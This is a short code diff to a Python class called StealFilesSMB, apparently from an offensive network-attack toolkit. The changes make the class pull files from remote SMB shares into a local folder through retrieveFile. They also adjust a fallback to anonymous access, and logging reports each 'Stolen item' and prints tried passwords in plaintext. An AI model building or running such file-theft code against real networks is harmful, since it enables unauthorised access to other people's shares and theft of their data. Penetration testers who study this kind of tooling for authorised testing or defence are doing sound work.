@@ -35,6 +35,7 @@ class StealFilesSMB(BaseSteal):
             self.connected = True
             return conn
         except Exception as e:
+            self.connected = False
             logger.error(f"SMB connection error for {ip} with user '{username}' and password '{password}': {e}")
             return None
 
@@ -57,8 +58,10 @@ class StealFilesSMB(BaseSteal):
                 raise ValueError("Path traversal detected")
             local_file_path = os.path.join(local_dir, rel_path)
             os.makedirs(os.path.dirname(local_file_path), exist_ok=True)
-            import shutil
-            shutil.copy2(remote_item, local_file_path)
+            share_name = remote_item.split('/')[1] if remote_item.startswith('/') else remote_item.split('/')[0]
+            remote_path = '/' + '/'.join(remote_item.split('/')[2:]) if remote_item.startswith('/') else '/'.join(remote_item.split('/')[1:])
+            with open(local_file_path, 'wb') as f:
+                conn.retrieveFile(share_name, remote_path, f)
             logger.success(f"Stolen item: {remote_item} -> {local_file_path}")
         except Exception as e:
             logger.error(f"Error stealing item {remote_item}: {e}")
@@ -138,7 +141,8 @@ class StealFilesSMB(BaseSteal):
                     logger.info(f"Anonymous access to {ip} failed: {e}")
                     return None, None
 
-            if not credentials and not try_anonymous_access():
+            conn_anon, shares_anon = try_anonymous_access()
+            if not credentials and not conn_anon:
                 logger.error(f"No valid credentials found for {ip}. Skipping...")
                 return 'failed'
 
